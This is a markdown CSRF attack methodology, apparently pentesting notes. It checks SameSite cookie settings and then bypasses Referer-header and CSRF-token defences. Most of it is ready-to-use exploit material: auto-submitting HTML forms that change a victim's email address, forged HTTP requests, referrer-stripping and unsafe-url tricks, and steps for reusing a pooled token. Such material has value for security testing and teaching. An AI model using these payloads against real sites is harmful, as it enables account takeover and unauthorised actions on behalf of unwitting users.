## CSRF Methodology
<br/>

**Step 1**<br/>
The first thing to check in a CSRF attack is the security headers on the session cookie.
#### `SameSite=Strict` - CSRF Not Possible

```html
Set-Cookie: SessionId=CfDJ8MWK4x...; samesite=strict;
```

#### `SameSite=LAX` - CSRF Only Possible on GET Request

```html
Set-Cookie: SessionId=CfDJ8MWK4x...; samesite=lax;
```

#### `SameSite=NONE` - CSRF Possible

```html
Set-Cookie: SessionId=CfDJ8MWK4x...; samesite=none;
```

**Step 2**<br/>
Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. The following are possible bypasses for the Referer header based CSRF protection.

1) *Referer Header Removed*<br/>
Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted. We can strip the referer using the following META tag.

```html
<meta name="referrer" content="never">
```

*PoC*
```html
<html>
    <body>
        <meta name="referrer" content="never">
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
            <input type="hidden" name="csrf" value="WfF1szMUHhiokx9AHOfjRkE" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

2) *Referer Header Broken Regex*<br/>
Some websites will use regex to check if the website is contained in the referer. This regex could be broken. 

You can try sending the referer with the target website being a subdomain to your website:
```
POST /change-email HTTP/1.1
Host: target.com
Cookie: session=3HTG8OIPW3TKkVhWvgIMN4Ojija8jijN
Referer: https://target.shelled.io/change-email

email=hacked@gmail.com
```

You can try sending the referer with the target website being a query parameter to your website:
```
POST /change-email HTTP/1.1
Host: target.com
Cookie: session=3HTG8OIPW3TKkVhWvgIMN4Ojija8jijN
Referer: https://shelled.io/change-email?target.com

email=hacked@gmail.com
```

> Note: There is a default browser security mechanism that strips query parameters from the referer header. You can override this behavior by making sure that the response containing your exploit has the Referrer-Policy: unsafe-url header set.

*PoC*
```html
<html>
    <body>
        <meta name="referrer-policy" content="unsafe-url">
        <script>
            history.pushState("", "", "/?target.com")
        </script>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
            <input type="hidden" name="csrf" value="WfF1szMUHhiokx9AHOfjRkE" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
<br/>

**Step 3**<br/>
If the session cookie’s SameSite value is set to none and the referer header is not being used for CSRF protection, then there is probably a CSRF token in place. The following are common CSRF token bypasses.

Request Method
Sometimes the CSRF token is only being validated in a POST request, you should also try to send the request as a GET request.

GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
Remove CSRF Token
Some applications correctly validate the token when it is present but skip the validation if the token is omitted.

POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net~~&csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY~~
CSRF Token Pool
Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.

1. Capture a CSRF attack POST request
2. Send request to repeater
3. Drop the request (dropping the request means the CSRF token will not be used, meaning the token is still in the CSRF token pool)
4. Create a CSRF PoC
5. Use the CSRF token in the repeater tab in the CSRF PoC







